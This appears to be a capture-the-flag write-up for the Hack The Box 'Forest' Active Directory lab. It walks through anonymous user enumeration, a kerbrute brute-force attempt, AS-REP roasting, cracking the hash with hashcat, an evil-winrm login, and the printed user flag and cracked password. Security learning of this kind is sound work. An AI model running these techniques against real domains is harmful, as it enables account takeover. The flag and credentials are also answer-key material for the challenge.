# Nmap

```
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
```
=> Add `FOREST.htb.local` to /etc/hosts

# SMB

```bash
smbclient -N -L \\\\10.129.2.15\\                                                     
# Anonymous login successful
# 
# Sharename       Type      Comment
# ---------       ----      -------
```
=> No shares

# DIG

```bash
dig any htb.local @10.129.2.15

; <<>> DiG 9.20.15-2-Debian <<>> any htb.local @10.129.2.15
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14839
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: aaa219546c2c34ca (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      ANY

;; ANSWER SECTION:
htb.local.              600     IN      A       10.129.2.15
htb.local.              600     IN      A       10.129.95.210
htb.local.              3600    IN      NS      forest.htb.local.
htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 126 900 600 86400 3600
htb.local.              600     IN      AAAA    dead:beef::c44:b0a7:d5c7:69c0
htb.local.              600     IN      AAAA    dead:beef::1e4

;; ADDITIONAL SECTION:
forest.htb.local.       1200    IN      A       10.129.2.15
forest.htb.local.       1200    IN      AAAA    dead:beef::c44:b0a7:d5c7:69c0
forest.htb.local.       1200    IN      AAAA    dead:beef::1e4

;; Query time: 24 msec
;; SERVER: 10.129.2.15#53(10.129.2.15) (TCP)
;; WHEN: Wed Dec 03 11:11:03 CET 2025
;; MSG SIZE  rcvd: 278
```

# User enum via RPC

```bash
impacket-samrdump 10.129.2.15 | tee impacket_samrdump.txt
```
=> this gives a lot of information like usernames, PasswordLastSet, logoncount

User enum alternative:
```bash
rpcclient -U "" -N 10.129.2.15

> enumdomusers
```

Users:
```
Found user: Administrator, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: DefaultAccount, uid = 503
Found user: $331000-VK4ADACQNUCA, uid = 1123
Found user: SM_2c8eef0a09b545acb, uid = 1124
Found user: SM_ca8c2ed5bdab4dc9b, uid = 1125
Found user: SM_75a538d3025e4db9a, uid = 1126
Found user: SM_681f53d4942840e18, uid = 1127
Found user: SM_1b41c9286325456bb, uid = 1128
Found user: SM_9b69f1b9d2cc45549, uid = 1129
Found user: SM_7c96b981967141ebb, uid = 1130
Found user: SM_c75ee099d0a64c91b, uid = 1131
Found user: SM_1ffab36a2f5f479cb, uid = 1132
Found user: HealthMailboxc3d7722, uid = 1134
Found user: HealthMailboxfc9daad, uid = 1135
Found user: HealthMailboxc0a90c9, uid = 1136
Found user: HealthMailbox670628e, uid = 1137
Found user: HealthMailbox968e74d, uid = 1138
Found user: HealthMailbox6ded678, uid = 1139
Found user: HealthMailbox83d6781, uid = 1140
Found user: HealthMailboxfd87238, uid = 1141
Found user: HealthMailboxb01ac64, uid = 1142
Found user: HealthMailbox7108a4e, uid = 1143
Found user: HealthMailbox0659cc1, uid = 1144
Found user: sebastien, uid = 1145
Found user: lucinda, uid = 1146
Found user: svc-alfresco, uid = 1147
Found user: andy, uid = 1150
Found user: mark, uid = 1151
Found user: santi, uid = 1152
```

Disabled accounts:
```bash
cat impacket_samrdump.txt| grep "AccountIsDisabled: True" 
# Guest (501)/AccountIsDisabled: True
# krbtgt (502)/AccountIsDisabled: True
# DefaultAccount (503)/AccountIsDisabled: True
# $331000-VK4ADACQNUCA (1123)/AccountIsDisabled: True
# SM_2c8eef0a09b545acb (1124)/AccountIsDisabled: True
# SM_ca8c2ed5bdab4dc9b (1125)/AccountIsDisabled: True
# SM_75a538d3025e4db9a (1126)/AccountIsDisabled: True
# SM_681f53d4942840e18 (1127)/AccountIsDisabled: True
# SM_1b41c9286325456bb (1128)/AccountIsDisabled: True
# SM_9b69f1b9d2cc45549 (1129)/AccountIsDisabled: True
# SM_7c96b981967141ebb (1130)/AccountIsDisabled: True
# SM_c75ee099d0a64c91b (1131)/AccountIsDisabled: True
# SM_1ffab36a2f5f479cb (1132)/AccountIsDisabled: True
```

Users with LogonCount != 0:
```bash
cat impacket_samrdump.txt| grep "LogonCount" | grep -v "LogonCount: 0"
# Administrator (500)/LogonCount: 104
# HealthMailboxc3d7722 (1134)/LogonCount: 1470
# HealthMailboxfc9daad (1135)/LogonCount: 59
# sebastien (1145)/LogonCount: 8
# svc-alfresco (1147)/LogonCount: 6
```

Password last set:
```bash
cat impacket_samrdump.txt| grep "PasswordLastSet" | grep -v "never"

# sebastien (1145)/PasswordLastSet: 2019-09-20 02:29:59.544725
# lucinda (1146)/PasswordLastSet: 2019-09-20 02:44:13.233891
# svc-alfresco (1147)/PasswordLastSet: 2025-12-03 11:49:00.209757
# andy (1150)/PasswordLastSet: 2019-09-23 00:44:16.291082
# mark (1151)/PasswordLastSet: 2019-09-21 00:57:30.243568
# santi (1152)/PasswordLastSet: 2019-09-21 01:02:55.134828
```
=> `svc-alfresco`, `andy` most recently set pw

# enum4linux-ng

Domain password information: 
```
Minimum password length: 7
Lockout threshold: None
```

# PW brute

Attempt to brute force PW:
```bash
~/Hacking/tools/kerbrute_linux_386 bruteuser -d htb.local --dc forest.htb.local /usr/share/wordlists/seclists/Passwords/corporate_passwords.txt <user>
```
=> No pw found for any user

# AS-REP Roasting

LDAP can be queried w/o creds:
```bash
impacket-GetNPUsers -dc-host forest.htb.local 'htb.local/'                                                                                                                                                                          1 ↵
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

# Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
# ------------  ------------------------------------------------------  ---------# -----------------  --------------------------  --------
# svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-12-03 13:31:46.535232  2025-12-03 13:17:11.845867  0x410200
```
=> `svc-alfresco`

Request users AS-REP and store it in a file. Had to use `-dc-ip` for the cmd to work:
```bash
impacket-GetNPUsers -request -outputfile hashes.asreproast -dc-ip 10.129.2.15 'htb.local/'
# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

# Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
# svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-12-03 13:38:39.833025  2025-12-03 13:17:11.845867  0x410200 



# $krb5asrep$23$svc-alfresco@HTB.LOCAL:e14d00bfe8df0fec20a068e42a550ebf$61b2c253c395a6d5d6ee5f1c740741aef2d5426e972dd8a364eee3e0a88dc26677bf1a8a400c687deedc5719a15dd7ad49a4146983e58fb4fcb581b50b5412b3e45c9501b3a7076450aae1fa668d44aa8200f4568da7432eb6ba3f8e65a1cd68c9ecda839dbc6dfb9f8220e5877cf0e17906743fadf6ad657bee7ce532af999b31c51bb3388c837cd167aa41a1d6fbdc1962304319132baf7604789124a7a9b719ca5fbc788438ecadb3dba56d9c093d4ecc997e342e790490bb547219338e1d246bf19c2fcf1ce96b2eacf867c64517e85a6d6f1ba0cbf0c4a7d54de631827c6567b614747a
```

Crack hash:
```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
# s3rvice
```
=> `svc-alfresco:s3rvice`

# Evil-winrm

```bash
evil-winrm -i 10.129.2.15 -u 'svc-alfresco' -p 's3rvice'
```

Flag:
```powershell
cat C:\Users\svc-alfresco\Desktop\user.txt
acc6247586125810d40abcc90f627a85
```
